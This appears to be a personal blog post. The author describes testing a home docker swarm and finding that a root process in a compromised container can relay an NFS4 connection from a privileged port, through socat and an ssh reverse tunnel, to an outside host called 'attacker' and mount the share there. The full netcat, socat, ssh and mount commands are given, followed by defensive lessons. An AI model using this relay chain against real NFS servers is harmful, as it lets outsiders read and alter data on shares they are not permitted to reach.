## Introduction
I recently set-up a **docker swarm** and was so excited! I absolutely do not need it, but you know, one day I might (yea sure).

The first thing I learnt was that to operate a swarm you needed a sort of network storage or a highly available storage. NFS4 was the winner for me and a NFS VM was created and shares were made for hosting docker volumes, what could go wrong?!

Well, at first everything seemed fine, but as some of you may know, setting up auth on NFS is a bit painful, at least for me it is. By default there is no authentication and access control is demanded to IP whitelisting. Okay cool.

I of course locked in the subnet of the swarm, so absolutely no one outside of it could access the shares.. yeah.. **I also enabled the `secure` option on NFS**, that demands the source port of the TCP connection to be lower than 1024, so it needs to be originated from the root user, which is kind of smart, I wouldn't never have thought about this.

I deployed some containers and played a bit with everything for a few days to find the perfect setup and then I was hit with a existential doubt: **What if a container's security gets compromised?**

I mean, I am okay with the fact that the container can access his own data, but **what if the container is able to access the whole NFS share**? Naahhh I must be missing something.. but let's test it anyway..

I simulate an RCE on a container that gets run as root (a lot of them are) and download netcat. I launch it to connect directly to the NFS share with a low port.. and guess what? It works.

`nc -v -p 532 nfs-share-ip 2049`

Okay now what? I mean **it should not be possible to mount the shares locally**, and in fact it's not, as there is the need of a privileged container.. ***but*** the TCP connection is open with the lower port and I cannot sleep at night by knowing that **the connection can be relayed somewhere** to be then mounted on a VM that has the `nfs` kernel module and all that it's needed to mount it..

I do a bit of research and decide to use `socat` to listen to port 2049 INSIDE the container while mapping it to the remote 2049 port of the NFS share, by specifying a source port that it's lower than 1024:

`socat TCP-LISTEN:2049,fork,reuseaddr TCP:NFSSERVER:2049,sourceport=532`

I now download `ssh` and launch: `ssh user@attacker -R 2049:127.0.0.1:2049`, with this command the **local port 2049 of the container gets mapped on the remote host** I am connecting to: `attacker`.

From the `attacker` host I then `sudo su` and issue `mount -t nfs4 127.0.0.1:/stuff /mnt` and... **it works**.

I successfully mounted a share that I shouldn't have access to, on a host that is not on the subnet.

This is what I see from the NFS host:

`tcp        0      0 x.x.x.x:2049     y.y.y.y:532      ESTABLISHED`

## Lessons learned

1. **Running containers as root**, even if unprivileged, **may be dangerous**.
2. If you have to run software as root inside the container, at least **make them use a "internal" connection** on docker, so they cannot contact outside IP addresses.
3. If you can't limit to user root and internal connection, absolutely **deny it the possibility to contact the TCP port of the NFS share**.


## Conclusion

What has been discovered is theoretical hot water, I perfectly know it, but **I couldn't find any source on internet regarding the information gathering of NFS4 shares** and also I think I am not the only one that has a similar setup.

Before relaying the connection with `socat` I tried all `nmap` scripts, but found out that they work only for NFS 3 and lower, as they make use of the `rpcbind` service. I found no tool/guide to gather information regarding NFS 4 shares, so I decided to write this mini guide.

Hope it's appreciated.
